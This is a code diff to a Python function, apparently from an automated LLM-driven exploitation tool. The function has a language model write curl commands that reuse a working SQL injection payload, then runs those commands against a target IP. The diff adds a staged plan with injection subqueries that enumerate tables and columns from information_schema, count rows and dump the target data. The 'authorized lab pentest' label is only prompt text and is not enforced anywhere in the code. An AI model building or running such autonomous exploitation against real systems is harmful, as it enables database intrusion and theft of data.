@@ -12931,60 +12931,93 @@ def _analyze_and_correct_exploit(cve, ip, port, command, vuln_class, eid, run_id
 
 
 def _collect_data_agent(cve, ip, port, working_command, objective, vuln_class, eid, run_id,
-                        model=None, session_cookie=None, max_iters=5):
-    """PHASE 2 — the data-collection agent. Given a CORRECTED, WORKING extraction payload,
-    systematically collect the objective (enumerate columns -> dump the table -> page long
-    values), enumerating each output to fix/advance. Returns {extracted, data, command, facts}."""
+                        model=None, session_cookie=None, max_iters=8):
+    """PHASE 2 — the data-collection agent. Given a CORRECTED, WORKING extraction payload, walk
+    the STAGED collection plan from the skill (tables -> columns -> row_counts -> data), reusing
+    the working payload and changing only the subquery. Each stage's result feeds the next.
+    Enumerates every output to fix/tweak. Returns {extracted, data, command, facts, discovered}."""
     try:
         from common import vuln_skills as _vs
-        skill = _vs.postex_for(issue_type=vuln_class, name=vuln_class) or {}
+        coll = _vs.postex_collection() or {}
     except Exception:  # noqa: BLE001
-        skill = {}
-    weap = skill.get("weaponize", ""); proof = skill.get("proof", ""); tgt = f"http://{ip}:{port}"
-    auth = f"Send this Cookie in every request: {session_cookie}. " if session_cookie else ""
-    facts = []; command = working_command; output = ""; extracted = False; data = ""; llm_model = None
-    for it in range(1, max(1, max_iters) + 1):
-        prompt = (f"AUTHORIZED lab pentest DATA-COLLECTION agent. The {vuln_class} exploit is "
-                  f"CORRECTED and WORKING on {tgt}. {auth}Now COLLECT the objective: {objective}.\n"
-                  f"Skill: {weap}\nProof required: {proof}\n"
-                  f"Working payload: {working_command}\nLast command: {command}\n"
-                  f"Last output (ENUMERATE it):\n{(output or '(run the working payload first)')[:1800]}\n"
-                  f"Learned: {'; '.join(facts[-6:]) or '(nothing yet)'}\n"
-                  f"Reuse the WORKING payload shape and only change the SUBQUERY to reach the "
-                  f"objective. If a column/table name is wrong, enumerate it from "
-                  f"information_schema first. If a value is truncated (~…~ ~32 chars), page it. "
-                  f"If the objective data is already present, set done=true.\n"
-                  f"Return ONE JSON only: {{\"command\": \"<next single curl>\", "
-                  f"\"done\": <true iff the last output has the objective data>, "
-                  f"\"extracted\": \"<objective data if present, else empty>\", "
-                  f"\"note\": \"<what you learned / next step>\"}}.")
-        res = _llm_for_model(prompt, model=model, caller="postex_collect", num_predict=900)
+        coll = {}
+    plan = coll.get("plan") or [
+        {"stage": "tables", "goal": "list all table names",
+         "subquery": "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"},
+        {"stage": "columns", "goal": "list the target table's columns",
+         "subquery": "SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<TABLE>'"},
+        {"stage": "row_counts", "goal": "count rows", "subquery": "SELECT COUNT(*) FROM <TABLE>"},
+        {"stage": "data", "goal": "dump the objective rows", "subquery": "SELECT group_concat(<COLS>) FROM <TABLE>"},
+    ]
+    methodology = coll.get("methodology", "")
+    tgt = "http://%s:%s" % (ip, port)
+    auth = ("Send this Cookie in every request: %s. " % session_cookie) if session_cookie else ""
+    facts = []
+    discovered = {"tables": None, "target_table": None, "columns": None, "row_count": None}
+    command = ""; output = ""; extracted = False; data = ""; llm_model = None
+    stage_i = 0; attempts = 0; iters = 0
+    while stage_i < len(plan) and iters < max_iters:
+        iters += 1
+        stage = plan[stage_i]
+        sqlite_hint = (" (SQLite: %s)" % stage.get("sqlite")) if stage.get("sqlite") else ""
+        prompt = (
+            "AUTHORIZED lab pentest DATA-COLLECTION agent, staged. The %s exploit is CORRECTED "
+            "and WORKING on %s. %s\n"
+            "Working payload (reuse its shape; change ONLY the subquery): %s\n"
+            "Methodology: %s\n"
+            "CURRENT STAGE: %s - %s\n"
+            "Template subquery for this stage: %s%s\n"
+            "Discovered so far: %s\n"
+            "Objective: %s\n"
+            "Last output (ENUMERATE it):\n%s\n"
+            "Fill <TABLE>/<COLS> from the discovered facts, choosing the table/columns whose "
+            "names match the objective. Produce ONE curl for THIS stage.\n"
+            "Return ONE JSON only: {\"command\": \"<curl>\", "
+            "\"value\": \"<this stage's result if the LAST output already contains it, else empty>\", "
+            "\"target_table\": \"<the table you are targeting, if known>\", "
+            "\"note\": \"<what you learned>\"}."
+        ) % (vuln_class, tgt, auth, working_command, methodology, stage["stage"],
+             stage.get("goal"), stage.get("subquery"), sqlite_hint, discovered, objective,
+             (output or "(none yet)")[:1500])
+        res = _llm_for_model(prompt, model=model, caller="postex_collect", num_predict=800)
         if isinstance(res, dict) and res.get("model"):
             llm_model = res["model"]
         j = _poc_extract_json(res.get("response", "") if isinstance(res, dict) else "") or {}
-        note = str(j.get("note", ""))[:200]
+        if j.get("target_table"):
+            discovered["target_table"] = str(j["target_table"])[:64]
+        note = str(j.get("note", ""))[:160]
         if note:
-            facts.append(note)
-        if j.get("done") and (j.get("extracted") or output):
-            extracted = True; data = str(j.get("extracted") or output)[:2000]
-            _poc_trace(run_id, "collect_done", iteration=it, response=f"collected: {data[:200]}")
-            break
+            facts.append("[%s] %s" % (stage["stage"], note))
+        val = j.get("value") or None
         command = str(j.get("command") or "").strip()
-        if not command:
-            break
-        output = _postex_run(command, ip, port)
-        enum = _enumerate_postex_output(output)
-        for f in enum["errors"]:
-            facts.append("FIX: " + f)
-        for tw in enum["tweaks"]:
-            facts.append("TWEAK: " + tw)
-        val = _extract_injection_value(output)
+        if command:
+            output = _postex_run(command, ip, port)
+            enum = _enumerate_postex_output(output)
+            for f in enum["errors"]:
+                facts.append("FIX: " + f)
+            for tw in enum["tweaks"]:
+                facts.append("TWEAK: " + tw)
+            val = _extract_injection_value(output) or val
+            _poc_trace(run_id, "collect_%s" % stage["stage"], iteration=iters, run_output=output,
+                       prompt=command, extra={"errors": enum["errors"], "value": val})
         if val:
-            facts.append(f"extracted value: {val[:80]}")
-        _poc_trace(run_id, "collect_run", iteration=it, run_output=output, prompt=command,
-                   extra={"errors": enum["errors"], "tweaks": enum["tweaks"], "value": val})
+            facts.append("STAGE %s: %s" % (stage["stage"], str(val)[:100]))
+            if stage["stage"] == "tables":
+                discovered["tables"] = str(val)[:500]
+            elif stage["stage"] == "columns":
+                discovered["columns"] = str(val)[:500]
+            elif stage["stage"] == "row_counts":
+                discovered["row_count"] = str(val)[:40]
+            elif stage["stage"] == "data":
+                data = str(val)[:2000]; extracted = True
+            stage_i += 1; attempts = 0
+        else:
+            attempts += 1
+            if attempts >= 2:            # give up on this stage after 2 tries, move on
+                facts.append("STAGE %s: no result after 2 tries - advancing" % stage["stage"])
+                stage_i += 1; attempts = 0
     return {"extracted": extracted, "data": data, "command": command, "facts": facts,
-            "llm_model": llm_model}
+            "llm_model": llm_model, "discovered": discovered}
 
 
 def _run_postex_weaponize(cve, ip, port, vuln_class, confirmed_command, eid, run_id=None,
